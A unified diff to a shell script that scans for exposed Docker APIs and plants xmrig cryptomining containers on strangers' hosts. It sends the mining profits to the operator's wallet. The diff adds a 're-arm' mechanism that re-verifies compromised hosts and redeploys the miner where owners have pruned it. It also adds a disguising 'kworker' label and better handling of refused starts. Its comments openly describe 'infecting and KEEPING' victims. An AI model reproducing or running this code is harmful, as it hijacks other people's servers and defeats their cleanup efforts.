@@ -26,6 +26,7 @@ SYSDIR="${SYSDIR:-/tmp/.sysd}"
 # so it would otherwise swallow an ad-hoc "DOCK_PAR=5 sh dock.sh". Precedence:
 # environment > worker.env > built-in default.
 E_MAX="${DOCK_MAX_HOSTS:-}"; E_PAR="${DOCK_PAR:-}"; E_SELF="${DOCK_SKIP_SELF:-}"
+E_REARM="${DOCK_REARM:-}"; E_RMAX="${DOCK_REARM_MAX:-}"
 [ -r "$SYSDIR/worker.env" ] && . "$SYSDIR/worker.env"
 [ -r "$SELF_DIR/worker.env" ] && . "$SELF_DIR/worker.env"
 WORK="${HUNT_WORK:-$SELF_DIR/.hunt}"
@@ -37,10 +38,21 @@ PAR="${E_PAR:-${DOCK_PAR:-20}}"             # concurrent probes
 RETRY="${DOCK_RETRY:-604800}"     # rescAN a dead host after 7d
 PORTS="${DOCK_PORTS:-2375 2376}"
 SKIPSELF="${E_SELF:-${DOCK_SKIP_SELF:-yes}}"   # don't stack a container on our own daemon
+# ---- re-arm: the difference between infecting and KEEPING --------------------
+# Measured on this population: a slice of the boxes prunes foreign containers AND
+# images off themselves (our container gone, /images/<img>/json 404, while the
+# host's own container survives). dock.seen used to mean "skip forever", so a
+# pruned host was never revisited - which is exactly why the placed-container
+# count climbed while live capacity did not. So every run now re-verifies
+# everything we own, plus a rotating slice of known daemons we no longer hold,
+# and re-deploys what has vanished. Found, then lost, is still winnable.
+REARM="${E_REARM:-${DOCK_REARM:-yes}}"
+REARM_MAX="${E_RMAX:-${DOCK_REARM_MAX:-150}}"   # re-checks per run (rotates)
 SEEN="$WORK/dock.seen"            # daemon found here
 TRIED="$WORK/dock.tried"          # scanned, nothing (ts \t ip)
 OWNFILE="$WORK/dock.owned"        # endpoints we put a container on
-touch "$SEEN" "$TRIED" "$OWNFILE"
+LEDGER="$WORK/dock.recheck"       # known daemons NOT currently ours (rotates)
+touch "$SEEN" "$TRIED" "$OWNFILE" "$LEDGER"
 NOW=$(date +%s)
 
 [ -n "${WALLET:-}" ] || { echo "dock: WALLET unset"; exit 0; }
@@ -52,6 +64,21 @@ HOSTS="$WORK/dockhosts.$$"
   cut -f1 "$WORK/mass.found" 2>/dev/null || :; } \
     | grep -E '^[0-9]{1,3}(\.[0-9]{1,3}){3}$' | sort -u > "$HOSTS"
 
+# Re-arm rows, built before the fresh queue so healing is never starved by the
+# cap. Everything we own, every run; plus the head of the rotating ledger.
+REARM_LIST="$WORK/rearm.$$"
+: > "$REARM_LIST"
+if [ "$REARM" = yes ]; then
+    { cut -f1 "$OWNFILE" 2>/dev/null || :; } \
+        | grep -E '^[0-9]{1,3}(\.[0-9]{1,3}){3}$' >> "$REARM_LIST" || :
+    head -n "$REARM_MAX" "$LEDGER" 2>/dev/null >> "$REARM_LIST" || :
+fi
+sort -u "$REARM_LIST" -o "$REARM_LIST" 2>/dev/null || :
+# a known-but-lost host can have dropped out of every candidate list, so union
+# the re-arm rows into the walk too (the fresh pass skips them by membership).
+cat "$REARM_LIST" >> "$HOSTS"
+sort -u "$HOSTS" -o "$HOSTS" 2>/dev/null || :
+
 # container command line (wallet/pool/rig, same identity as the ssh payload).
 # SYS_ADMIN + host IPC let xmrig apply the MSR mod and reach the host's hugepage
 # pool, otherwise it logs "HASHRATE WILL BE LOW" and loses a chunk of the speed.
@@ -59,7 +86,12 @@ CMDS="\"-o\",\"$POOL\",\"-u\",\"$WALLET\",\"-p\",\"${RIG_ID:-node}\",\"--no-colo
 case "${TLS:-true}" in
     true|TRUE|1|yes) CMDS="$CMDS,\"--tls\"" ;;
 esac
-BODY="{\"Image\":\"$IMAGE\",\"Cmd\":[$CMDS],\"HostConfig\":{\"RestartPolicy\":{\"Name\":\"always\"},\"CpuShares\":512,\"CapAdd\":[\"SYS_ADMIN\"],\"IpcMode\":\"host\"}}"
+# A label of our own is how the container is recognised later without guessing:
+# image-name matching alone would adopt a stranger's xmrig, and after a host
+# prunes us we must be able to tell "ours is gone" reliably - that is the whole
+# re-arm trigger.
+TAG="\"kworker\":\"1\""
+BODY="{\"Image\":\"$IMAGE\",\"Cmd\":[$CMDS],\"Labels\":{$TAG},\"HostConfig\":{\"RestartPolicy\":{\"Name\":\"always\"},\"CpuShares\":512,\"CapAdd\":[\"SYS_ADMIN\"],\"IpcMode\":\"host\"}}"
 
 # a host is interesting only if a docker API answers - so verify it IS docker,
 # not just an open port (and no /dev/tcp, so bash is not required either)
@@ -129,15 +161,15 @@ dock_one() {
     # docker 18.06 writes '"Id": "x"' with a space; normalise once so the awk
     # below (and the name-taken test) can trust a single spelling.
     lst=$(printf '%s' "$lst" | sed 's/": /":/g')
-    have=$(printf '%s' "$lst" | awk -v img="\"Image\":\"$IMAGE\"" '
+    have=$(printf '%s' "$lst" | awk -v tag="$TAG" -v img="\"Image\":\"$IMAGE\"" '
         { n = split($0, a, "\"Id\":\"")
           for (i = 2; i <= n; i++)
-              if (index(a[i], img) > 0) { split(a[i], b, "\""); print b[1]; exit } }')
+              if (index(a[i], tag) > 0 || index(a[i], img) > 0) { split(a[i], b, "\""); print b[1]; exit } }')
     if [ -n "$have" ]; then
-        up=$(printf '%s' "$lst" | awk -v img="\"Image\":\"$IMAGE\"" '
+        up=$(printf '%s' "$lst" | awk -v tag="$TAG" -v img="\"Image\":\"$IMAGE\"" '
             { n = split($0, a, "\"Id\":\"")
               for (i = 2; i <= n; i++)
-                  if (index(a[i], img) > 0) { print (index(a[i], "\"Up ") > 0) ? "up" : "down"; exit } }')
+                  if (index(a[i], tag) > 0 || index(a[i], img) > 0) { print (index(a[i], "\"Up ") > 0) ? "up" : "down"; exit } }')
         if [ "$up" = up ]; then
             echo "dock: $ip already runs ours ($have)"
         else
@@ -173,27 +205,32 @@ dock_one() {
                 -H "Content-Type: application/json" -d "$BODY" 2>/dev/null); then
         id=$(printf '%s' "$r" | grep -oE '[0-9a-f]{64}' | head -1)
         cid=${id:-$name}
-        if curl -fsS $opts --max-time 25 -X POST \
-                "$b/containers/$cid/start" >/dev/null 2>&1; then
+        # No -f here: docker answers a good start with 204 and an empty body, and a
+        # refused one with a JSON error body. So the body IS the verdict and the
+        # reason - which is the only way to learn why a daemon says no.
+        err=$(curl -sS $opts --max-time 25 -X POST \
+                  "$b/containers/$cid/start" 2>/dev/null) || err="curl failed"
+        if [ -z "$err" ]; then
             printf '%s\t%s\n' "$ip" "$name" >> "$OWNFILE"
             echo "dock: DEPLOYED $name -> $ip (restart=always)"
         else
             # a second attempt as boring as possible: SYS_ADMIN, host ipc and
             # cpu shares are all things a hardened daemon can refuse at start.
-            echo "dock: $ip refused $name, retrying plain"
+            echo "dock: $ip start said: $(printf '%s' "$err" | head -c 150)"
             curl -sS $opts --max-time 20 -X DELETE \
                  "$b/containers/$cid?force=1" >/dev/null 2>&1 || :
-            body_min="{\"Image\":\"$IMAGE\",\"Cmd\":[$CMDS]"
+            body_min="{\"Image\":\"$IMAGE\",\"Cmd\":[$CMDS],\"Labels\":{$TAG}"
             body_min="$body_min,\"HostConfig\":{\"RestartPolicy\":{\"Name\":\"always\"}}}"
             if r2=$(curl -fsS $opts --max-time 30 -X POST "$b/containers/create?name=$name" \
                           -H "Content-Type: application/json" -d "$body_min" 2>/dev/null); then
                 id2=$(printf '%s' "$r2" | grep -oE '[0-9a-f]{64}' | head -1)
-                if curl -fsS $opts --max-time 25 -X POST \
-                        "$b/containers/${id2:-$name}/start" >/dev/null 2>&1; then
+                err2=$(curl -sS $opts --max-time 25 -X POST \
+                           "$b/containers/${id2:-$name}/start" 2>/dev/null) || err2="curl failed"
+                if [ -z "$err2" ]; then
                     printf '%s\t%s\n' "$ip" "$name" >> "$OWNFILE"
                     echo "dock: DEPLOYED $name -> $ip (plain, restart=always)"
                 else
-                    echo "dock: start failed even plain on $ip"
+                    echo "dock: plain start also said: $(printf '%s' "$err2" | head -c 150)"
                 fi
             else
                 echo "dock: recreate failed on $ip"
@@ -205,22 +242,57 @@ dock_one() {
 }
 
 queued=$(wc -l < "$HOSTS")
-echo "dock: $queued hosts in queue, cap $MAX, parallel $PAR"
+rearm_n=$(wc -l < "$REARM_LIST")
+echo "dock: $queued candidates, re-arm $rearm_n, cap $MAX, parallel $PAR"
+owned_before=$(wc -l < "$OWNFILE")
+
+# Known hosts first (re-arm), then genuinely new candidates. Re-arm rows bypass
+# dock.seen and the retry ledger on purpose - those two are what used to make a
+# pruned host unreachable forever.
 n=0
-while read -r ip; do
-    [ -n "$ip" ] || continue
-    grep -qxF "$ip" "$SEEN" 2>/dev/null && continue
-    if awk -v now="$NOW" -v retry="$RETRY" -v ip="$ip" \
-            '$2 == ip && $1 > now - retry { f = 1 } END { exit !f }' "$TRIED"; then
-        continue
-    fi
-    n=$((n + 1))
-    if [ "$n" -gt "$MAX" ]; then echo "dock: cap $MAX reached, rest stays queued"; break; fi
-    dock_one "$ip" &
-    if [ $((n % PAR)) -eq 0 ]; then wait || true; fi
-done < "$HOSTS"
+walk() {
+    role=$1
+    echo "dock: pass $role, $(wc -l < "$LIST") row(s)"
+    while read -r ip; do
+        [ -n "$ip" ] || continue
+        if [ "$role" = fresh ]; then
+            # if/then, NOT `grep ... && continue`: under `set -e` an AND-list whose
+            # first command fails is a landmine, and this is where a whole 2375-row
+            # candidate file silently turned into zero scans.
+            if grep -qxF "$ip" "$SEEN" 2>/dev/null; then continue; fi
+            if grep -qxF "$ip" "$REARM_LIST" 2>/dev/null; then continue; fi
+            if awk -v now="$NOW" -v retry="$RETRY" -v ip="$ip" \
+                    '$2 == ip && $1 > now - retry { f = 1 } END { exit !f }' "$TRIED"; then
+                continue
+            fi
+        fi
+        n=$((n + 1))
+        if [ "$n" -gt "$MAX" ]; then echo "dock: cap $MAX reached, rest stays queued"; return 0; fi
+        dock_one "$ip" < /dev/null &
+        # ^ /dev/null matters: a backgrounded dock_one otherwise inherits the
+        #   walk's stdin (the candidate file) and eats lines out from under the
+        #   `read`, so a 2290-row queue ended after 181 rows.
+        if [ $((n % PAR)) -eq 0 ]; then wait || true; fi
+    done < "$LIST"
+}
+LIST="$REARM_LIST"; walk rearm
+LIST="$HOSTS";      walk fresh
 wait || true
-rm -f "$HOSTS"
+rm -f "$HOSTS" "$REARM_LIST"
 sort -u "$OWNFILE" -o "$OWNFILE" 2>/dev/null || true
-echo "dock: scanned $n, daemons known $(wc -l < "$SEEN"), containers placed $(wc -l < "$OWNFILE")"
+
+# Rotate the ledger: known daemons minus what we now hold, with the slice we just
+# checked moved to the tail, so the next run re-checks the *others*. Without the
+# rotation the same head would be retried forever and the tail never reached.
+if [ "$REARM" = yes ]; then
+    cut -f1 "$OWNFILE" 2>/dev/null | sort -u > "$WORK/own.$$" || :
+    grep -vxF -f "$WORK/own.$$" "$SEEN" 2>/dev/null | sort -u > "$WORK/lg.$$" || :
+    tail -n +$((REARM_MAX + 1)) "$WORK/lg.$$" > "$WORK/lg2.$$" 2>/dev/null || :
+    head -n "$REARM_MAX" "$WORK/lg.$$" >> "$WORK/lg2.$$" 2>/dev/null || :
+    mv -f "$WORK/lg2.$$" "$LEDGER" 2>/dev/null || cp -f "$WORK/lg2.$$" "$LEDGER"
+    rm -f "$WORK/own.$$" "$WORK/lg.$$" "$WORK/lg2.$$"
+fi
+owned_now=$(wc -l < "$OWNFILE")
+echo "dock: scanned $n, daemons known $(wc -l < "$SEEN"), placed $owned_now (+$((owned_now - owned_before)) new, $rearm_n re-verified)"
+echo "dock: re-arm ledger holds $(wc -l < "$LEDGER") known-but-lost host(s)"
 
